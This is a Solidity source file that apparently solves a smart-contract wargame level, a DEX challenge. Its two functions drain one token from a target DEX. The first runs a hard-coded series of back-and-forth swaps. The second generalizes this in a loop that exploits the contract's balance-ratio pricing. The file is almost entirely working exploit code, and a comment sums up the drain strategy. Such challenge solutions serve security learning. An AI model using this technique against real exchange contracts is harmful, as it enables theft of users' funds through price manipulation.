// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract DexAttack is Broadcasted {
    function attack(address payable dexCtr_) public payable override {
        // approve dex contract to spend 1000 tokens
        IDex(dexCtr_).approve(dexCtr_, 1000);

        address token1 = IDex(dexCtr_).token1();
        address token2 = IDex(dexCtr_).token2();

        IDex(dexCtr_).swap(address(token1), address(token2), 10);
        IDex(dexCtr_).swap(address(token2), address(token1), 20);
        IDex(dexCtr_).swap(address(token1), address(token2), 24);
        IDex(dexCtr_).swap(address(token2), address(token1), 30);
        IDex(dexCtr_).swap(address(token1), address(token2), 41);
        IDex(dexCtr_).swap(address(token2), address(token1), 45);
    }

    function elegantAttack(address payable dexCtr_) public payable {
        //! I personally rather this function, it is more generic and formal, but
        //! it is too expensive and don't have enough faucet TT:(
        // approve dex contract to spend 1000 tokens
        IDex(dexCtr_).approve(dexCtr_, 1000);

        address token1 = IDex(dexCtr_).token1();
        address token2 = IDex(dexCtr_).token2();

        uint256 balance1 = IDex(dexCtr_).balanceOf(token1, tx.origin);
        uint256 balance2 = IDex(dexCtr_).balanceOf(token2, tx.origin);

        uint256 contractBalance1 = IDex(dexCtr_).balanceOf(token1, dexCtr_);
        uint256 contractBalance2 = IDex(dexCtr_).balanceOf(token2, dexCtr_);

        // while the contract balance is not 0 on any of the tokens
        uint256 balanceToSwap;
        while (!(contractBalance1 == 0 || contractBalance2 == 0)) {
            //
            if (balance1 < balance2) {
                balanceToSwap = balance2 <= contractBalance2
                    ? balance2
                    : contractBalance2;
                _swap(token2, token1, balanceToSwap, dexCtr_);
            } else {
                balanceToSwap = balance1 <= contractBalance1
                    ? balance1
                    : contractBalance1;
                _swap(token1, token2, balanceToSwap, dexCtr_);
            }
            balance1 = IDex(dexCtr_).balanceOf(token1, tx.origin);
            balance2 = IDex(dexCtr_).balanceOf(token2, tx.origin);
            contractBalance1 = IDex(dexCtr_).balanceOf(token1, dexCtr_);
            contractBalance2 = IDex(dexCtr_).balanceOf(token2, dexCtr_);
        }
    }

    function _swap(
        address token1_,
        address token2_,
        uint256 amount_,
        address dexCtr_
    ) internal {
        IDex(dexCtr_).swap(token1_, token2_, amount_);
    }
}

interface IDex {
    //! the solution is simply swap all the tokens until draining one of the tokens of the contract
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(address from, address to, uint amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint);

    function approve(address spender, uint amount) external;
}

interface IToken {
    function balanceOf(address account) external view returns (uint);
}
